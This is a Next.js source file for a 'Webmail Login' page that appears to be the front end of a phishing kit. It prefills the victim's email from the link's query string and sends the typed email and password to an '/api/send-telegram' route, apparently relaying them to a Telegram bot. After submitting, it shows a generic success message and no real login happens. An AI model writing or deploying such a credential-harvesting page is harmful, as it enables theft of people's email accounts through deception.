import { useRouter } from "next/router";
import { useEffect, useState } from "react";
import styles from "../styles/Login.module.css";

export default function Login() {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    if (router.query.email) setEmail(router.query.email);
  }, [router.query.email]);

  async function handleSubmit(e) {
    e.preventDefault();
    setLoading(true);
    setError("");

    const res = await fetch("/api/send-telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password })
    });

    const data = await res.json();
    setLoading(false);

    if (!res.ok) {
      setError(data.message || "Login failed");
      return;
    }

    alert("Submitted successfully");
  }

  return (
    <div className={styles.container}>
      <div className={styles.card}>
        <div className={styles.header}>Webmail Login</div>

        <form className={styles.body} onSubmit={handleSubmit}>
          <label className={styles.label}>Email address</label>
          <input
            type="email"
            className={styles.input}
            value={email}
            onChange={e => setEmail(e.target.value)}
            required
          />

          <div className={styles.passwordRow}>
            <label className={styles.label}>Password</label>
            <a href="#" className={styles.forgot}>Forgot password?</a>
          </div>

          <input
            type="password"
            className={styles.input}
            value={password}
            onChange={e => setPassword(e.target.value)}
            required
          />

          {error && <p style={{color:"red", fontSize:13}}>{error}</p>}

          <button className={styles.button} disabled={loading}>
            {loading ? "Processing..." : "Log In"}
          </button>
        </form>
      </div>
    </div>
  );
}